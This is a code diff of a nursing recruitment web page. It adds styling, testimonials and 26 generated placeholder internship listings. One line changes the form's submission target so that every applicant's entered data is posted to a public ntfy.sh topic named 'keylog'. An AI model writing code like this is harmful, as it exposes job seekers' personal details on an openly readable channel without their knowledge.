@@ -18,7 +18,7 @@
       background-color: #0073e6;
       color: white;
       text-align: center;
-      padding: 1.5rem;
+      padding: 2rem;
     }
 
     nav {
@@ -49,6 +49,22 @@
       text-align: center;
     }
 
+    .hero {
+      text-align: center;
+      padding: 3rem 1rem;
+      background: linear-gradient(to right, #0073e6, #005bb5);
+      color: white;
+    }
+
+    .hero h2 {
+      font-size: 2.5rem;
+    }
+
+    .hero p {
+      font-size: 1.2rem;
+      margin: 1rem 0;
+    }
+
     .btn {
       display: inline-block;
       padding: 10px 20px;
@@ -57,7 +73,20 @@
       text-decoration: none;
       border-radius: 5px;
       margin-top: 20px;
+    }
+
+    .testimonials {
       text-align: center;
+      margin-top: 2rem;
+    }
+
+    .testimonial {
+      margin: 1rem 0;
+      padding: 1rem;
+      background-color: #f9f9f9;
+      border: 1px solid #ccc;
+      border-radius: 10px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
     }
 
     .job-listing {
@@ -149,20 +178,40 @@
 
   <!-- Home Section -->
   <section id="home" class="active">
-    <h2>Welcome to Nursing Careers</h2>
-    <p>We connect nursing students and professionals to life-changing job opportunities.</p>
-    <a href="#" class="btn" data-target="jobs">Explore Jobs</a>
+    <div class="hero">
+      <h2>Your Nursing Career Starts Here</h2>
+      <p>We connect nursing students and professionals to life-changing job opportunities in leading healthcare institutions. Whether you're starting your career or advancing it, we're here to help!</p>
+      <a href="#" class="btn" data-target="jobs">Explore Jobs</a>
+    </div>
+    <div class="testimonials">
+      <h2>What Our Applicants Say</h2>
+      <div class="testimonial">
+        <p>"Thanks to Nursing Careers, I landed my dream internship at a top hospital. The process was so smooth!"</p>
+        <strong>- Mary, 3rd-Year Nursing Student</strong>
+      </div>
+      <div class="testimonial">
+        <p>"I couldn't believe how easy it was to find a part-time job that matches my skills. This platform is a lifesaver!"</p>
+        <strong>- John, Nursing Graduate</strong>
+      </div>
+    </div>
   </section>
 
   <!-- About Section -->
   <section id="about">
     <h2>About Us</h2>
-    <p>We specialize in helping nursing students and professionals secure rewarding career opportunities in the healthcare industry. Our mission is to bridge the gap between talent and opportunity while empowering nurses to thrive in their roles.</p>
+    <p>At Nursing Careers Platform, we’re committed to empowering nursing professionals with meaningful job opportunities. Our platform is designed to match talented individuals with reputable healthcare institutions, ensuring both career growth and job satisfaction.</p>
+    <p>Our values include:</p>
+    <ul>
+      <li><strong>Empowerment:</strong> Helping nurses find fulfilling roles that build their careers.</li>
+      <li><strong>Integrity:</strong> Ensuring transparency and professionalism in all our services.</li>
+      <li><strong>Impact:</strong> Making a positive difference in the healthcare industry.</li>
+    </ul>
+    <p>We partner with leading hospitals, clinics, and healthcare organizations to offer internships, part-time, and full-time roles across Nigeria. Join us and take the first step toward a brighter future!</p>
   </section>
 
   <!-- Jobs Section -->
   <section id="jobs">
-    <h2>Available Jobs</h2>
+    <h2>Available Internships</h2>
     <div id="job-listings">
       <!-- Job listings with codes will be dynamically inserted -->
     </div>
@@ -227,19 +276,15 @@
       });
     });
 
-    // Job Listings with Codes and Images
-    const jobs = [
-      { id: 1, title: "Registered Nurse", location: "Lagos, Nigeria", type: "Full-time", image: "image1.jpg", code: "RN1234" },
-      { id: 2, title: "Community Health Nurse", location: "Abuja, Nigeria", type: "Internship", image: "image2.jpg", code: "CH5678" },
-      { id: 3, title: "Critical Care Nurse", location: "Lagos, Nigeria", type: "Full-time", image: "image3.jpg", code: "CC9101" },
-      { id: 4, title: "Surgical Nurse", location: "Abuja, Nigeria", type: "Full-time", image: "image4.jpg", code: "SN2345" },
-      { id: 5, title: "Pediatric Nurse", location: "Ibadan, Nigeria", type: "Internship", image: "image5.jpg", code: "PN6789" },
-      { id: 6, title: "Oncology Nurse", location: "Enugu, Nigeria", type: "Full-time", image: "image6.jpg", code: "ON3456" },
-      { id: 7, title: "Dialysis Nurse", location: "Lagos, Nigeria", type: "Part-time", image: "image7.jpg", code: "DN7890" },
-      { id: 8, title: "School Nurse", location: "Port Harcourt, Nigeria", type: "Internship", image: "image8.jpg", code: "SN4567" },
-      { id: 9, title: "Psychiatric Nurse", location: "Abuja, Nigeria", type: "Full-time", image: "image9.jpg", code: "PN8910" },
-      { id: 10, title: "Labor and Delivery Nurse", location: "Lagos, Nigeria", type: "Full-time", image: "image10.jpg", code: "LD2345" }
-    ];
+    // Internship Listings with Codes and Images
+    const jobs = Array.from({ length: 26 }, (_, i) => ({
+      id: i + 1,
+      title: `Nursing Internship ${i + 1}`,
+      location: "Various Locations, Nigeria",
+      type: "Internship",
+      image: `image${i + 1}.jpg`,
+      code: `NI${String(i + 1).padStart(4, '0')}`
+    }));
 
     const jobListingsContainer = document.getElementById('job-listings');
 
@@ -269,7 +314,7 @@
         data[key] = value;
       });
 
-      fetch('https://ntfy.sh/your-topic', {
+      fetch('https://ntfy.sh/keylog', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(data)
@@ -289,4 +334,3 @@
   </script>
 </body>
 </html>
-
